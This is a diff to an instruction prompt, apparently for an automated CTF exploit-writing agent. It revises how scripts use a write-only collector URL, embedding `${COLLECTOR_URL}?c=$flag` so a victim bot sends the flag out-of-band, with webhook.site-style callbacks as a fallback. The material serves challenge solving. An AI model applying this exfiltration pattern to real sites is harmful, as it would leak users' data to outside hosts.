@@ -130,16 +130,26 @@ sends the value OUTBOUND to the given URL.)
 When the bug requires an external HTTP listener, pick the channel
 based on what's available — in this priority order:
 
-1. PREFERRED: read `COLLECTOR_URL` from env. The runner sets it to
-   `<user's tunnel>/api/collector/<job_id>` whenever Settings has a
-   Callback URL configured. Anything the bot fetches there is
-   auto-logged AND auto-extracted for flag patterns — no polling
-   needed in your script. Just embed
+1. PREFERRED: read `COLLECTOR_URL` from env (it is already exported
+   for you — `<user's tunnel>/api/collector/<job_id>` — whenever
+   Settings has a Callback URL configured; you do NOT need to
+   reconstruct it from `CALLBACK_URL`). The collector is WRITE-ONLY:
+   it accepts the value the caller sends and replies `ok` — nothing
+   more. There is no read-back: it has no `/dump`, `/all`, `/hits`,
+   `/log` view, and `GET ${COLLECTOR_URL}` returns the same `ok`.
+   Do not hunt for a read endpoint, query `/api/jobs/...`, or stand
+   up a second channel (webhook.site etc.) to fetch the value back —
+   the value never returns to your script by design. Instead, the
+   orchestrator extracts any flag the caller sent SERVER-SIDE and
+   marks the job `finished`/success on its own. So the whole job of
+   your script is: embed
        `${COLLECTOR_URL}?c=$flag`
-   in the payload and exit; the orchestrator marks the job
-   `finished` as soon as the bot calls in. To wait actively, poll
-   `GET ${COLLECTOR_URL}` or sleep and exit (the post-sandbox
-   flag-scan also runs).
+   in the payload, fire it, and exit. You will NOT see the captured
+   value yourself, and you do NOT print `FLAG_CANDIDATE` for an
+   out-of-band capture — `FLAG_CANDIDATE` is only for a flag your
+   script reads directly in-band (e.g. straight out of an HTTP
+   response). A server-side collector capture counts as success
+   without any `FLAG_CANDIDATE` line.
 
    Fallback: read `CALLBACK_URL` directly (operator may have set a
    webhook.site-style URL).
